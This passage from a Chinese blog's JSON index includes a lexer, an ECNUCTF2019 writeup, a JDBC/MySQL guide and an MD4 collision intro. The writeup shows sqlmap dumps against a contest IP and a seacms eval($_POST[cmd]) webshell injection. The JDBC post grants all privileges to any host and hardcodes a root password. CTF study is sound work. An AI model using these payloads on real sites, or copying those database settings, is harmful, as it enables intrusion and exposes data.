{\u0026#34;static\u0026#34;, 24}, {\u0026#34;struct\u0026#34;, 25}, {\u0026#34;switch\u0026#34;, 26}, {\u0026#34;typedef\u0026#34;, 27}, {\u0026#34;union\u0026#34;, 28}, {\u0026#34;unsigned\u0026#34;, 29}, {\u0026#34;void\u0026#34;, 30}, {\u0026#34;volatile\u0026#34;, 31}, {\u0026#34;while\u0026#34;, 32}, {\u0026#34;-\u0026#34;, 33}, {\u0026#34;--\u0026#34;, 34}, {\u0026#34;-=\u0026#34;, 35}, {\u0026#34;-\u0026gt;\u0026#34;, 36}, {\u0026#34;!\u0026#34;, 37}, {\u0026#34;!=\u0026#34;, 38}, {\u0026#34;%\u0026#34;, 39}, {\u0026#34;%=\u0026#34;, 40}, {\u0026#34;\u0026amp;\u0026#34;, 41}, {\u0026#34;\u0026amp;\u0026amp;\u0026#34;, 42}, {\u0026#34;\u0026amp;=\u0026#34;, 43}, {\u0026#34;(\u0026#34;, 44}, {\u0026#34;)\u0026#34;, 45}, {\u0026#34;*\u0026#34;, 46}, {\u0026#34;*=\u0026#34;, 47}, {\u0026#34;,\u0026#34;, 48}, {\u0026#34;.\u0026#34;, 49}, {\u0026#34;/\u0026#34;, 50}, {\u0026#34;/=\u0026#34;, 51}, {\u0026#34;:\u0026#34;, 52}, {\u0026#34;;\u0026#34;, 53}, {\u0026#34;?\u0026#34;, 54}, {\u0026#34;[\u0026#34;, 55}, {\u0026#34;]\u0026#34;, 56}, {\u0026#34;^\u0026#34;, 57}, {\u0026#34;^=\u0026#34;, 58}, {\u0026#34;{\u0026#34;, 59}, {\u0026#34;|\u0026#34;, 60}, {\u0026#34;||\u0026#34;, 61}, {\u0026#34;|=\u0026#34;, 62}, {\u0026#34;}\u0026#34;, 63}, {\u0026#34;~\u0026#34;, 64}, {\u0026#34;+\u0026#34;, 65}, {\u0026#34;++\u0026#34;, 66}, {\u0026#34;+=\u0026#34;, 67}, {\u0026#34;\u0026lt;\u0026#34;, 68}, {\u0026#34;\u0026lt;\u0026lt;\u0026#34;, 69}, {\u0026#34;\u0026lt;\u0026lt;=\u0026#34;, 70}, {\u0026#34;\u0026lt;=\u0026#34;, 71}, {\u0026#34;=\u0026#34;, 72}, {\u0026#34;==\u0026#34;, 73}, {\u0026#34;\u0026gt;\u0026#34;, 74}, {\u0026#34;\u0026gt;=\u0026#34;, 75}, {\u0026#34;\u0026gt;\u0026gt;\u0026#34;, 76}, {\u0026#34;\u0026gt;\u0026gt;=\u0026#34;, 77}, {\u0026#34;\\\u0026#34;\u0026#34;, 78}, {\u0026#34;%d\u0026#34;, 81}, {\u0026#34;%s\u0026#34;, 81}, {\u0026#34;%c\u0026#34;, 81}, {\u0026#34;%f\u0026#34;, 81}, {\u0026#34;%lf\u0026#34;, 81} }; string cur, tmp; int len, cnt; bool show_time; vector\u0026lt;string\u0026gt; annos[2]; /* 打印常数，输出至非数字字符 */ void print_num(int \u0026amp;idx) { if (show_time) cout \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;++cnt \u0026lt;\u0026lt;\u0026#34;: \u0026lt;\u0026#34; \u0026lt;\u0026lt; cur[idx++]; while (isdigit(cur[idx])) { cout \u0026lt;\u0026lt;cur[idx++]; } cout \u0026lt;\u0026lt;\u0026#34;,80\u0026gt;\u0026#34;; } /* 打印非常数词素 */ inline void print_token(const string \u0026amp;token, const int \u0026amp;id) { if (show_time) cout \u0026lt;\u0026lt; endl; // 处理最后换行问题 cout \u0026lt;\u0026lt;++cnt \u0026lt;\u0026lt;\u0026#34;: \u0026lt;\u0026#34; \u0026lt;\u0026lt; token \u0026lt;\u0026lt;\u0026#34;,\u0026#34;\u0026lt;\u0026lt; id \u0026lt;\u0026lt;\u0026#34;\u0026gt;\u0026#34;; } /* 清除所有注释 */ void rip_anno(string\u0026amp; prog) { int pos = 0, from, to; while ((from = prog.find(\u0026#34;//\u0026#34;, pos)) != string::npos) { to = prog.find(\u0026#39;\\n\u0026#39;, from); annos[0].push_back(prog.substr(from, to-from)); // 先保存注释内容 prog.erase(from, to-from); prog.insert(from,\u0026#34;@\u0026#34;+ to_string(annos[0].size())); // 插入单行注释标记 @ } pos = 0; while ((from = prog.find(\u0026#34;/*\u0026#34;, pos)) != string::npos) { to = prog.find(\u0026#34;*/\u0026#34;, from); annos[1].push_back(prog.substr(from, to-from+2)); prog.erase(from, to-from+2); prog.insert(from,\u0026#34;`\u0026#34;+ to_string(annos[1].size())); // 插入多行注释标记 ` } prog.erase(prog.find_last_not_of(\u0026#34; \\n\\r\\t\u0026#34;) + 1); // 删除尾部空格 } void Analysis() { string prog = \u0026#34;int main()\\n{\\nprintf(\\\u0026#34;HelloWorld\\\u0026#34;);\\nreturn 0;\\n}\u0026#34;; //read_prog(prog); rip_anno(prog); istringstream ss(prog); // 用空格分隔每次读入 while (!ss.eof()) { ss \u0026gt;\u0026gt; cur; len = cur.length(); for (int i = 0; i \u0026lt; len;) { /* 每次 for 循环开始时，必定是新词素 */ if (isdigit(cur[i])) { print_num(i); } else { if (tokens[cur] == 0) { // 用空格分隔出的串不能直接匹配词素 // 极端情况如：for(var=0;var\u0026lt;10;++var){...;...;}，递归处理可能爆栈，因此用循环 int j = 1, k; while (i + j \u0026lt;= len \u0026amp;\u0026amp; tokens[cur.substr(i, j)] == 0) ++j; // 从左至右尝试匹配词素，直到第一次匹配成功 if (i + j\u0026gt; len) { // 整个串都无法匹配，因此串以标识符开头 for (k = i; k \u0026lt; len \u0026amp;\u0026amp; (cur[k] == \u0026#39;_\u0026#39; || isalnum(cur[k])); ++k); // 截取标识符名 if (k == i \u0026amp;\u0026amp; !isalpha(cur[k])) { // 特判：这里可能是单字母变量，或我们加的注释标记 print_token(annos[cur[k] == \u0026#39;@\u0026#39; ? 0 : 1][cur[k+1]-1 - \u0026#39;0\u0026#39;], 79); i = min(len, k + 2); // 为什么词法分析器要把注释当词素处理而不是直接清除注释？多此一举 } else { print_token(cur.substr(i, k - i), 81); i = k; } } else { while (i + j \u0026lt;= len \u0026amp;\u0026amp; tokens[cur.substr(i, j)] != 0) ++j; // 成功匹配后，进行贪婪匹配 tmp = cur.substr(i, j - 1); print_token(tmp, tokens[tmp]); i += j - 1; // 跳过已被贪婪匹配的词素并继续 } } else { print_token(cur, tokens[cur]); show_time = true; break; } } show_time = true; // 第一个词素已经打印了！ } } } ","date":"2019-04-11","permalink":"/posts/lex-analysis/","section":"Posts","summary":"\u003cp\u003e奇怪的思路果然总是通向奇怪的出路。\u003c/p\u003e","title":"走远了的词法分析器"},{"content":"第二次参加 CTF，上次参加时还只知道古典密码。\n吐槽 # 在周六 8 点起床不是我的风格，但这周六我还是做到了。9 点开始比赛，到晚上近 10 点才关掉比赛网页。午饭点了外卖，傍晚跑了个步回家吃晚饭，有效比赛时间大概在 10 小时左右。\n不知道为什么，现在的 CTF 比赛居然有理论题了，都是网安知识不过范围比较广，许多题得靠搜索引擎帮忙……\n做理论题做到一半网站就十分卡，感觉是被人 DDOS 了。到了近十点想交理论题的时候居然交不上了，看来主办方被 D 了个措手不及，好在修复还算及时，很快就交上了。\n真正的 CTF 题在 10 点准时开放，然而所有题都放在了同一个服务器上，而这个服务器又一次遭受了恶意攻击，导致所有人都看不到题（只能欣赏题面精致的文案）。我猜运维肯定一脸懵逼，以致于在我们失望地等待了十几分钟后赛题才恢复正常。在此期间，积分榜却是开放的，上面全都是选手实名。。。十分无语，现在我应该不知道被社工多少次了。\n等待网站恢复时发现第三题题面的图片很有趣，看起来像是帮助解题的关键线索：\n通过 Google 图片搜索，我在 这里 发现了相关介绍，不过后来事实证明这跟解题一点关系也没有。\n下面是 writeup 正文，大部分结果都是由队友启发得到的。\n1. 土肥原贤二 # 显然这里可以查询数据库，考虑 SQL 注入攻击。输入 1 查询后发现 payload 可以构造为 gid=1，然后 Kali 下运行 sqlmap 可以直接得到 flag。\n$ sqlmap -u \u0026#39;http://47.103.43.235:81/quest/web/a/index.php?gid=1\u0026#39; --current-db # current database: luozhen $ sqlmap -u \u0026#39;http://47.103.43.235:81/quest/web/a/index.php?gid=1\u0026#39; -D luozhen --tables # tables in database luozhen: flag, good $ sqlmap -u \u0026#39;http://47.103.43.235:81/quest/web/a/index.php?gid=1\u0026#39; -D luozhen -T flag --columns # columns in table flag: flag, id $ sqlmap -u \u0026#39;http://47.103.43.235:81/quest/web/a/index.php?gid=1\u0026#39; -D luozhen -T flag -C flag,id --dump 2. 吴佩孚 # 网页内的字符串符合典型的 Base64 编码的格式，解码得到 jsfuck 代码，在浏览器 Console 中运行即得到 flag。\n3. 死亡真相 # 坑题，题面和音频疯狂暗示摩斯电码，但实际上跟摩斯电码根本没有关系。听音频听不到什么有用的信息，于是用 Cool Edit Pro 打开并查看频谱图：\n然而尝试提交后发现不是 flag。\n注意到三个下划线有异样，猜想它们是 flag 中的空缺字符。爆破难度较大，因此大胆猜测三个下划线表示的是同一个数字。从 0 开始尝试到 9 但都不是正确的 flag。\n观察新得到的 flag 值，发现其长度恰好为 32 个字符，这与 md5 算法哈希的结果形式一致。在 这个神奇的网站 尝试 md5 解密得到 flag，即下划线表示 0。\n注：右键查看音频属性可以看到两个 zero 一个 0，早点看到就不用试那么多次了。。而且即使保留下划线进行 md5 解密同样可以获得 flag，但是要想到 md5 并不容易，略坑。\n4. 日军空袭 # 网页中的内容明显是 Base64 编码，进行多次解码（第一次解码无输出，尝试结尾加一个 / 两个等号就可以解码了）并 Unescape 后，重新排列得到的字符串，获得 flag。\n5. 飞虎队 # 天坑，参考了 这篇博客。\n对希尔矩阵求逆、通分、模 26 意义下加法后，得到解密矩阵：\n8 16 27 8 99 24 27 24 27 将密文 3 个字符分为一组，转为 ASCII 码后再乘以解密矩阵，再模 26 对应到英文字母，就可以得到 flag。这个做法真的很坑。\n6. 戴星炳 # import requests from bs4 import BeautifulSoup import lxml url = \u0026#34;http://47.103.43.235:82/web/a/index.php\u0026#34; res = requests.session() ret = res.get(url) soup = BeautifulSoup(ret.content, \u0026#39;lxml\u0026#39;) t = eval(soup.children.__next__().next()[1].contents[0]) data = { \u0026#39;result\u0026#39;: t } flag = res.post(url, data=data) print(flag.text) 由于要求 2 秒内算出，因此考虑用 python 脚本发送请求，并计算算式的值后提交得到 flag。\n7. 大美晚报 # （假装这里有一张二维码图片）\n对我来说有点难的 Misc 题。一开始以为是 web，但是根本没办法通过解析二维码得到什么有用的信息。只能下载图片，binwalk 一下，果然有压缩包：\n根据密码是管理员 qq 号的线索，fcrackzip 跑半小时爆破 zip 密码…… 得到 flag。\n8. 潘汉年 # s = u\u0026#34;bg[`sZ*Zg\u0026#39;dPfP`VM_SXVd\u0026#34; t = u\u0026#34;\u0026#34; for i in range(0, len(s)): t = t + chr(ord(s[i])+i+1+3) print(t) 看到密文形式很容易想到凯撒，但是本题的关键在于猜出这个凯撒变体是怎么变的。猜的方法其实很通用，将前四个字母对应到 “flag”，观察凯撒变换的规律即可。\n9. 袁殊 # 虽然我知道 RSA 算法的原理，但这题似乎依然在我能力范围之外。参考了 这篇博客。\n其实就是原题改了数据，主办方有点不走心啊。。按葫芦画瓢，先解出 e 和 n：\n$ openssl rsa -pubin -text -modulus -in fllllllag.txt -in gy.key Public-Key: (256 bit) Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9 Exponent: 65537 (0x10001) Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni 0bXTcqTQiRLZAgMBAAE= -----END PUBLIC KEY----- 在 这里 因式分解 n，得到 p 和 q。\n最后写 python 脚本得到 flag：\nimport gmpy2 import rsa p = 273821108020968288372911424519201044333 q = 280385007186315115828483000867559983517 n = 76775333340223961139427050707840417811156978085146970312315886671546666259161 e = 65537 d = int(gmpy2.invert(e, (p-1)*(q-1))) privatekey = rsa.PrivateKey(n, e, d, p, q) with open(\u0026#34;fllllllag.txt\u0026#34;, \u0026#34;rb\u0026#34;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) 10. 76 号 # 难题。用 IDA 观察了很久很久，唯一有点线索的是这个sub_8048580：\n（此处省略了一部分代码）\n看到了显眼的 48 和 97，猜测是根据输入字符的 ASCII 码判断密码是否正确，将上面的代码（只截了一部分）仔细整理成表格查看，可以得到这样一张表（已对第二列去重）：\n0 0 7 5 9 1 b 11 d 3 e 7 f 4/8 i 9 j 10 k 12 v 2 w 6 从这张表中还是看不出什么端倪，然而如果单看第二列的话，感觉第二列的所有数字正好组成了模 13 的最小非负完全剩余系。众所周知， 在解谜游戏中遇到这种完全剩余系，一般都会考虑指向性谜题。本题也同样适用，即把 0 放到第 0 位，7 放到第 5 位，9 放到第 1 位…… 以此类推，就可以得到 13 位的密码，也就是 flag 了。\n$ ./obfuse Password: 09vdf7wefijbk Correct! 11. 晴气庆胤 # 查看源代码发现： 说明要构造两个不同的字符串且它们的 md5 值相同，因此在 Burp/Postman 中发送 POST 请求：\n12. 梅津美治郎 # 在 IDA 中打开 Auth.exe，观察 _main 函数，在函数末尾发现：\n可以立即得到第一关密码 “r0b0RUlez!“。对于第二关密码，可以确定的是依然会调用 strcmp 函数，因此我们需要找到 call strcmp 语句并设置断点，此时第二关需要的密码应该可以在栈中找到。首先查找 strcmp:\n设置断点并调试：\n查看 EAX：\n得到疑似第二关密码：\n输入后发现密码错误，因此我们需要回去看一下，我们忽略了什么环节。在上图的 _main 伪代码中，我们看到 \u0026ldquo;You passed level1!\u0026rdquo; 后就没有看下去了，然而下面的 sub_4015EA 却是第二关的关键：\n这里发生了异常跳转。我们查找它的外部引用，进入了 sub_40157F:\n见到了老朋友 scanf 函数，下一步当然是跟踪进 sub_401547：\n答案很明了了。原来这个函数对我们刚才得到的 “第二关密码” 又进行了按位异或 2。于是我们作同样计算后得到第二关密码：\nFlag 只需要用下划线拼接两关密码即可。\n13. 冈村宁次 # 显然又是 SQL 注入，唯一的注入点在 id。url 中出现的 id===QM，三个等号看起来很奇怪，大胆猜测 ==QM 是倒置的 Base64 编码，解码 MQ== 得到 1，正好与列出数据的 id 一致。因此只需要写注入语句后进行一次 Base64 编码，再反转字符串即可。\n多次尝试后得出结论：本题过滤了等号、空格、union、select、or 等关键字，因此采用双写绕过、十六进制绕过、注释绕过等手段改写 SQL 语句实现注入。这里 sqlmap 就很难帮到我们了。\n14. 作战计划 # 网站唯一的注入点位于搜索框，查阅有关 seacms 漏洞的资料来构造 payload：\nhttp://47.103.43.235:84/search.php?searchtype=5\u0026amp;tid=\u0026amp;area=eval($_POST[cmd])\n并连接菜刀 / 蚁剑，拿到网站 shell 后可以在根目录发现 flag.txt。\n15. 池步洲 # 在源代码中发现：\n\u0026lt;!-- index.phps --\u0026gt; 访问该文件，得到：\n\u0026lt;?php error_reporting(0); $flag = \u0026#39;********\u0026#39;; if (isset($_POST[\u0026#39;name\u0026#39;]) and isset($_POST[\u0026#39;password\u0026#39;])){ if ($_POST[\u0026#39;name\u0026#39;] == $_POST[\u0026#39;password\u0026#39;]) print \u0026#39;name and password must be different\u0026#39;; else if (sha1($_POST[\u0026#39;name\u0026#39;]) == sha1($_POST[\u0026#39;password\u0026#39;])) die($flag); else print \u0026#39;invalid password\u0026#39;; } ?\u0026gt; 可以看到这里要求：name 和 password 不同，且 sha1 值相同。由于 php 中的 sha1 漏洞会使任意两个数组的 sha1 值相同，因此构造 payload：\n总结 # 由于参加比赛太少，经验还是有欠缺，比赛时对很多常见的模式都没有足够的敏感度，许多工具也是现场搭起来用的。\nReverse 和 Pwn 还是超级菜，后者并没有在初赛出现，但是据说决赛会有很多 Pwn 题。。记得去年决赛发呆 5 小时做了题隐写，希望今年能不垫底？\n","date":"2019-03-31","permalink":"/posts/ecnuctf2019/","section":"Posts","summary":"\u003cp\u003e第二次参加 CTF，上次参加时还只知道古典密码。\u003c/p\u003e","title":"ECNUCTF2019 初赛 writeup"},{"content":"大概是第二次被 MySQL 玩了，也可能是第三次。\n使用环境 # Java 开发环境：Win10 + JDK1.8 + Idea MySQL 版本：8.x（其实用的是 MariaDB，不过差不多） MySQL 的 JDBC 驱动版本：8.x（事实证明，这个和 MySQL 版本号至少最高位必须是一样的） MySQL 运行环境：VMware WorkStation 15 Player + Kali Linux 2.0 流程 # 在 MySQL 中新建数据库，例如叫 test，可以新建一些数据表并插入一些数据，使得在 Java 中可以操作它们并看到结果。 在 Idea 中新建项目，导入 MySQL 驱动并编写程序。 打包成 jar 包，放到虚拟机里用 java -jar xxx.jar 运行。 就这么简单。然而如此简单的三步中居然还能有那么多的坑点。\nIdea 导入 MySQL 驱动 # 这里并不坑。Idea 还是很友好的。\nFile -\u0026gt; Project Structure -\u0026gt; Modules -\u0026gt; Dependencies -\u0026gt; Module Source -\u0026gt; 绿色加号 -\u0026gt; JARs or Directories -\u0026gt; 后面应该不用说了 搞定。\n坑点 # 其实在我把 jar 包放到服务器上运行后，自始至终只遇到了这种错误：\njava.sql.SQLNonTransientConnectionException: Could not create connection to database server. Attempted reconnect 3 times. Giving up. 这个错误似乎非常常见，因为能引起这个错误的因素太多了。StackOverflow 中的一个超有料的问题 里的一些回答给出了非常多的解决方法。我强烈建议读者点进链接看一下尤其是第一个回答，感受一下 MySQL 的坑点之多、之恐怖。其中很多原因是来源于 MySQL 8.x 与 5.x 的巨大差异。\n我据此对程序进行了许多修改，包含的坑点有（粗体为可能导致这次错误的原因）：\nJava 可能将 localhost 解析为 IPv6 地址 ::1，而不是 IPv4 的 127.0.0.1，然而 MySQL 只认后者；解决方法是把 localhost 换成 127.0.0.1。 确保连接时的用户名与密码正确，为此我重设了下密码。 在 url 中设置参数 autoReconnect=true 防止意外断连。 在 url 中设置参数 useUnicode=true。 在 url 中设置参数 characterEncoding=utf-8。 在 url 中设置参数 useSSL=false。 不使用 SSL。（似乎是 8.x 新要求） 在 url 中设置参数 serverTimezone=GMT%2B8。 设置时区为东 8 区，当然服务器也要设置 set global time_zone='+8:00'。（似乎是 8.x 新要求） Class.forName(\u0026quot;com.mysql.cj.jdbc.Driver\u0026quot;); 而不是 Class.forName(\u0026quot;com.mysql.jdbc.Driver\u0026quot;);（8.x 新特性，很重要） 注释掉配置文件中的 bind-address 一行，放行来自所有 IP 的连接。 在 MySQL 中运行命令 GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY 'password';。 别忘了重启 MySQL 服务。 吐槽 # 没花太多时间解决这个问题，不过中间一度想在虚拟机上搭个 LAMP 当服务器用（等等，IP 地址怎么办？），以为那样就可以不用踩这些坑了。有机会试试用 Maven 项目连数据库。\n另外，我记得上次被 MySQL 玩是因为 5.x 和 8.x 版本对密码的哈希方式不一样吧？\n2019.4.1 更新 # 对于上面 “虚拟机 IP 地址” 的回答：内网 IP。是我当时蠢了。把 IP 地址换成内网 IP（如下方代码）可以直接在 Idea 下调试，方便多了。\n顺手贴个代码：\nimport java.sql.*; import java.util.ArrayList; import java.util.Scanner; public class Main { public static void main(String[] args) { String url = \u0026#34;jdbc:mysql://192.168.30.128:3306/test?\u0026#34; + \u0026#34;autoReconnect=true\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf-8\u0026amp;\u0026#34; + \u0026#34;useSSL=false\u0026amp;serverTimezone=GMT%2B8\u0026#34;; String userName = \u0026#34;root\u0026#34;; String password = \u0026#34;celine\u0026#34;; Connection conn; PreparedStatement stmt = null; ResultSet rs = null; String sql; Scanner sc = new Scanner(System.in); try { Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); conn = DriverManager.getConnection(url, userName, password); System.out.println(\u0026#34;Connected to MySQL via JDBC.\\n\u0026#34;); System.out.println(\u0026#34;Enter: [0] to get metadata, [1-9] to perform 9 tasks on the Movie database, [-1] to quit.\u0026#34;); int op; while((op = sc.nextInt()) != -1) { switch (op) { case 0: //display metadata sql = \u0026#34;show tables\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); ArrayList\u0026lt;String\u0026gt; tables = new ArrayList\u0026lt;\u0026gt;(); while (rs.next()) { tables.add(rs.getString(1)); } for(String table: tables) { sql = \u0026#34;select * from\u0026#34; + table + \u0026#34;limit 1;\u0026#34;; rs = stmt.executeQuery(sql); ResultSetMetaData metaData = rs.getMetaData(); System.out.println(\u0026#34;table name:\u0026#34; + table); System.out.println(\u0026#34;columns:\\n\u0026#34;); for(int i = 1; i \u0026lt;= metaData.getColumnCount(); ++i) { System.out.println(\u0026#34;\\t\u0026#34; + metaData.getColumnName(i) + \u0026#34;\\t\u0026#34; + metaData.getColumnTypeName(i)); } System.out.println(); } break; case 1: sql = \u0026#34;select count(*) from Movies;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(\u0026#34;1. Number of movies:\u0026#34; + rs.getInt(\u0026#34;count(*)\u0026#34;)); } break; case 2: sql = \u0026#34;select title from Movies;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\u0026#34;2. All titles:\u0026#34;); while (rs.next()) { System.out.println(rs.getString(\u0026#34;title\u0026#34;)); } break; case 3: sql = \u0026#34;select min(year) from Movies;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(\u0026#34;3. Min year:\u0026#34; + rs.getInt(\u0026#34;min(year)\u0026#34;)); } break; case 4: sql = \u0026#34;select count(*) from Actors;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(\u0026#34;4. Number of actors:\u0026#34; + rs.getInt(\u0026#34;count(*)\u0026#34;)); } break; case 5: sql = \u0026#34;select givenNames, familyName from Actors where familyName=\u0026#39;Zeta-Jones\u0026#39;;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\u0026#34;5. Who\u0026#39;s Zeta-Jones:\u0026#34;); while (rs.next()) { System.out.println(rs.getString(\u0026#34;givenNames\u0026#34;) +\u0026#34; \u0026#34; + rs.getString(\u0026#34;familyName\u0026#34;)); } break; case 6: sql = \u0026#34;select distinct(genre) from BelongsTo;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\u0026#34;6. Genres:\u0026#34;); while (rs.next()) { System.out.println(rs.getString(\u0026#34;genre\u0026#34;)); } break; case 7: sql = \u0026#34;select m.title, m.year from Movies m\u0026#34; + \u0026#34;join Directs s on (s.movie = m.id) \u0026#34; + \u0026#34;join Directors d on (s.director = d.id) \u0026#34; + \u0026#34;where d.familyName =\u0026#39;Spielberg\u0026#39;;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\u0026#34;7. Spielberg has directed:\u0026#34;); while (rs.next()) { System.out.println(\u0026#34;Title:\u0026#34; + rs.getString(\u0026#34;title\u0026#34;) + \u0026#34;|\u0026#34; + \u0026#34;Year:\u0026#34; + rs.getString(\u0026#34;year\u0026#34;)); } break; case 8: sql = \u0026#34;select a.givenNames, a.familyName from Actors a\u0026#34; + \u0026#34;where not exists (select id from Movies\u0026#34; + \u0026#34;except (select movie as id from AppearsIn where actor = a.id));\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\u0026#34;8. Super actor:\u0026#34;); while (rs.next()) { System.out.println(rs.getString(\u0026#34;givenNames\u0026#34;) +\u0026#34; \u0026#34; + rs.getString(\u0026#34;familyName\u0026#34;)); } break; case 9: /* sql = \u0026#34;create view nDirected as\u0026#34; + \u0026#34;select d.id as director, count(s.movie) as ntimes \u0026#34; + \u0026#34;from Directors d left outer join Directs s on (d.id = s.director) \u0026#34; + \u0026#34;group by d.id;\u0026#34;; stmt.execute(sql); */ sql= \u0026#34;select d.givenNames, d.familyName as name\u0026#34; + \u0026#34;from nDirected nd join Directors d on (nd.director = d.id) \u0026#34; + \u0026#34;where ntimes = 0;\u0026#34;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\u0026#34;9. Lazy Director:\u0026#34;); while (rs.next()) { System.out.println(rs.getString(\u0026#34;givenNames\u0026#34;) +\u0026#34; \u0026#34; + rs.getString(\u0026#34;familyName\u0026#34;)); } break; } System.out.println(); } rs.close(); stmt.close(); conn.close(); } catch (Exception e) { e.printStackTrace(); } finally { if (rs != null) { try { rs.close(); } catch (SQLException sqlEx) { } // ignore } if (stmt != null) { try { stmt.close(); } catch (SQLException sqlEx) { } // ignore } } } } ","date":"2019-03-25","permalink":"/posts/jdbc-mysql/","section":"Posts","summary":"\u003cp\u003e大概是第二次被 MySQL 玩了，也可能是第三次。\u003c/p\u003e","title":"通过 JDBC 连接 MySQL"},{"content":"其实最大的心得是不要一次开多个项目。\n在这次的 “老有所得” 项目中，我主要负责项目中前后端通讯部分的开发。我们团队遵循前后端分离的开发原则，因此在前端开发时我无需了解太多后端的实现细节，只需要掌握后端提供的 API 的功能与特性。这一开发原则无疑大大提高了整个项目开发过程的并行度，也简化了我的工作。\n项目后端部署在 CentOS 服务器上，前端通过访问服务器特定端口的特定 url 来向服务器发起请求。例如登录请求：\nhttp://\u0026lt;server_ip\u0026gt;:8080/signIn?username=uname\u0026amp;password=pwd\n众所周知，网络请求发生错误是十分常见的，后端出现异常也同样是家常便饭，因此，为了在数据获取出错时及时定位问题，我利用 Postman 来模拟对服务器发送请求的操作以检查返回的数据，并利用 Navicat 检查数据库内的数据是否及时更新，以及对数据库进行修改。利用好这两个软件极大地提高了调试错误的效率。\n向后端发送的请求通常是 HTTP/POST 方法的异步请求，这就要用到 AJAX 技术（实际上获取数据通常采用 JSON 格式而不是 XML）。异步请求提高了应用的性能，但是却会带来被戏称为 “回调地狱”（callback hell）的问题——由于异步请求的原理，返回的数据都是由回调函数来处理，在代码中回调函数常常会嵌套很多层，使得代码非常难维护和理解。本项目中我主要通过将函数模块化的办法解决这一问题。\n另一个巨大的、而又极易被忽视的问题是：回调函数与 js 中的主函数的执行是类似并行的，这使得在回调函数中修改变量的值可能会滞后，或者说迟于我们期望的时间。这一问题十分危险而隐蔽，因此我通常都在回调函数内部完成需要用到被修改变量的操作。\n最后值得一提的就是 Vue.js 中的数据绑定问题，这类问题也是耗费我时间最久的一类。首先，在 Vue.js 中通过索引给数组元素赋值是无法触发视图更新的。因此我主要使用如下两种方式更新数组：\nthis.listData.push(ret.data[item]) // 1 this.$set(this.replyTime, item, this.$calcTime(ret.data[item].creatime.time)) // 2 对于二维数组的更新，采用这种较为麻烦的变体：\nconst temp_list = this.listData[val].slice(0) for (let item in ret.data) { temp_list.push(ret.data[item]) } this.$set(this.listData, val, temp_list) 其次，诸如 Mustache 内部和 v-bind 系列的数据绑定中，不能直接使用函数的返回值，这一问题困扰了我非常之久，最后通过使用数组元素绑定，并通过函数获取数组内数据的方式绕过了这一限制。\n最后，v-if 与 v-for 在同一节点中出现时，v-for 优先级更高，可以把 v-if 放在父节点上来避免这种情况；嵌套 v-for 时，节点的 :key 属性必须两两不同。\n本项目中，我学习了新的前端框架 uni-app 和 Vue.js，尽管各有一定不足，我依然认为两者为项目开发提供了不少便利；而在界面布局与设计上，我并没有太多贡献，不过在进行调整时使用到了 flex 布局，算是比较大的收获。\n","date":"2019-03-18","permalink":"/posts/adminder/","section":"Posts","summary":"\u003cp\u003e其实最大的心得是不要一次开多个项目。\u003c/p\u003e","title":"“老有所得” 项目实践心得"},{"content":"重复了王小云教授 14 年前的工作，RIPEMD/MD5/SHA 家族碰撞原理类似。\n课程《Hash 函数安全性分析》要求我们基于王小云教授在 2005 年欧密会上发表的 Cryptanalysis of the Hash Functions MD4 and RIPEMD，实现对 MD4 函数的碰撞攻击。所谓 MD4 函数，就是大名鼎鼎的 MD5 函数的前身，后者相较于前者更为安全（尽管也同样被王小云教授找到了碰撞攻击的方法）。值得一提的是，MD4 和 MD5 的发明者是 Ronald Rivest，也就是 RSA 中的‘R’。\n本文可以看作是对这篇著名论文的中文概述，其中混杂了一些个人在构筑代码时的简略思路。\nMD4 算法介绍 # MD4 是将任意长度的消息压缩为 128bit 的一种单向散列函数。MD4 先将消息填充至其长度为 512bit 的整数倍（即使消息原长已经是 512bit 的整数倍），随后将填充后的消息压缩至 128bit。由于填充消息的方法与 MD4 碰撞无关，这里不再赘述，我们只关注压缩消息的方法。\n为了阐释 MD4 压缩函数的步骤，首先定义三个函数：\n$$ F(X,Y,Z) = (X\\land Y)\\lor (\\lnot X\\land Z)\\\\ G(X,Y,Z) = (X\\land Y)\\lor (X\\land Z)\\lor (Y\\land Z)\\\\ H(X,Y,Z) = X\\oplus Y\\oplus Z $$\n其中 X,Y,Z 都是 32bit 的字（注意到在 C++ 中，unsigned int 可以很好地表示它们）。压缩函数共 3 轮，每轮有 16 步操作，每次操作都会更新链接变量 a,b,c,d 之一。更新时需要用到这三个函数：\n$$ \\phi_0(a,b,c,d,m_k,s) = ((a + F(b,c,d) + m_k)\\ mod\\ 2^{32})\\lll s\\\\ \\phi_1(a,b,c,d,m_k,s) = ((a + G(b,c,d) + m_k + 0x5a827999)\\ mod\\ 2^{32})\\lll s\\\\ \\phi_2(a,b,c,d,m_k,s) = ((a + H(b,c,d) + m_k + 0x6ed9eba1)\\ mod\\ 2^{32})\\lll s $$\n而 a,b,c,d 的初始值定义为：\n$$ (a,b,c,d) = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) $$\n这里的 4 个 16 进制数，以及上面 $\\phi_1$ 和 $\\phi_2$ 式中的 2 个 16 